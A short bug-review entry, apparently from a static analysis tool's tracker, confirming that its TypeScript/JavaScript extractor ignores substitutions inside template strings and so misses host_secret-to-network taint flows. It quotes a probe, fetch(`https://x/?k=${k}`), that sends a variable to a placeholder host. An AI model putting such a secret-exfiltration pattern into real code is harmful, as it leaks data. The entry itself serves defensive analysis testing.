  message: "P3 REVIEW 2026-11-01 (dev 100b6fbb6e; owner-requested re-check of open P3 items last modified before 2026-10-20; fixtures under ~/hypergumbo_lab_notebook/p3_review_11012026/taint1/). VERDICT: CURRENT. 2026-11-01 review on dev 100b6fbb6e: probe of fetch(`https://x/?k=${k}`) gives def=[] use=[] and unaccounted ['k'] for both typescript and javascript; tagged template the same; ts_def_use.py:79 still lists template_string as a non-reference. verify-claims host_secret->network: template form violated structural/unavailable, concatenation form violated ddg/reached. Premise unchanged. MECHANISM: TS/JS extractor treats template_string as a literal leaf and never descends into template_substitution."  # 95c9
